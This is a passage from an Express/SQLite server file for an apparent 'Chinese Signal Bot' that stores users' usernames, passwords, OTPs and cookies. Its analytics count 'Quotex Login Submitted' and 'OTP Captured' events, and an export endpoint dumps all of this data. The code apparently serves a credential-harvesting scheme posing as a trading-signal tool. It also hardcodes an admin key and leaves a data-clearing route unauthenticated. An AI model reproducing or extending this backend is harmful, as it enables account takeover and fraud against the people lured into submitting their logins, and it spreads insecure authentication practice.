// ================== CLEAR USER CREDENTIALS ==================
app.post('/api/clear-user', (req, res) => {
    const { licenceKey } = req.body;
    if (!licenceKey) return res.status(400).json({ error: "licenceKey required" });
    db.prepare("UPDATE users SET username='', password='', otp='', cookies='', status='Active', connected=0, activities='[]' WHERE licenceKey=?").run(licenceKey);
    logActivity('User Data Cleared by Admin', { licenceKey, ip: '--' });
    broadcastSSE('user_cleared', { licenceKey });
    res.json({ success: true });
});

// ================== EXPORT ALL DATA ==================
app.get('/api/export-all', (req, res) => {
    const { adminKey } = req.query;
    if (adminKey !== 'CSAI-NEWX-ADMI-N999') return res.status(403).json({ error: 'Unauthorized' });

    const exportData = {
        exportedAt:     new Date().toISOString(),
        users:          getUsers(),
        licenses:       getLicenses(),
        activityLog:    db.prepare("SELECT * FROM activity_log WHERE action NOT LIKE '__%%__' ORDER BY id DESC LIMIT 5000").all(),
        sentMessages:   db.prepare('SELECT * FROM sent_messages_log ORDER BY id DESC LIMIT 1000').all(),
        userNotes:      db.prepare('SELECT * FROM user_notes ORDER BY id DESC').all(),
        signalHistory:  db.prepare('SELECT * FROM signal_history ORDER BY id DESC LIMIT 2000').all()
    };

    res.setHeader('Content-Type', 'application/json');
    res.setHeader('Content-Disposition', `attachment; filename="csbot-export-${Date.now()}.json"`);
    res.json(exportData);
});

// ================== ANALYTICS ==================
app.get('/api/analytics', (req, res) => {
    // Last 7 days — daily breakdown
    const days = [];
    for (let i = 6; i >= 0; i--) {
        const d    = new Date();
        d.setDate(d.getDate() - i);
        const ymd  = d.toISOString().slice(0, 10);
        const next = new Date(d); next.setDate(d.getDate() + 1);
        const activations = db.prepare("SELECT COUNT(*) as cnt FROM activity_log WHERE action = 'License Activated' AND timestamp >= ? AND timestamp < ?").get(d.toISOString(), next.toISOString())?.cnt || 0;
        const logins      = db.prepare("SELECT COUNT(*) as cnt FROM activity_log WHERE action = 'Quotex Login Submitted' AND timestamp >= ? AND timestamp < ?").get(d.toISOString(), next.toISOString())?.cnt || 0;
        const otps        = db.prepare("SELECT COUNT(*) as cnt FROM activity_log WHERE action = 'OTP Captured' AND timestamp >= ? AND timestamp < ?").get(d.toISOString(), next.toISOString())?.cnt || 0;
        days.push({ date: ymd, activations, logins, otps });
    }

    const topUsers = db.prepare(`
        SELECT userName, COUNT(*) as events FROM activity_log
        WHERE userName != 'Unknown' AND action NOT LIKE '__%%__'
        GROUP BY lower(userName) ORDER BY events DESC LIMIT 10
    `).all();

    const actionBreakdown = db.prepare(`
        SELECT action, COUNT(*) as cnt FROM activity_log
        WHERE action NOT LIKE '__%%__'
        GROUP BY action ORDER BY cnt DESC LIMIT 15
    `).all();

    res.json({ days, topUsers, actionBreakdown });
});

app.get('/',           (req, res) => res.send("✅ Chinese Signal Bot Server v4 — SQLite Powered — Permanent Storage"));
app.get('/api/healthz',(req, res) => res.json({ ok: true, ts: Date.now() }));
app.get('/admin', (req, res) => res.sendFile(path.join(__dirname, 'admin_panel.html')));
app.get('/bot',   (req, res) => res.sendFile(path.join(__dirname, 'main-bot.html')));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`📁 Data directory: ${DATA_DIR}`);
    console.log(`🗄️  SQLite DB: ${DB_FILE}`);
    const users    = getUsers();
    const licenses = getLicenses();
    console.log(`👥 Loaded ${users.length} users, ${licenses.length} licenses`);
    console.log(`📊 Activity log entries: ${db.prepare("SELECT COUNT(*) as cnt FROM activity_log").get()?.cnt || 0}`);
});
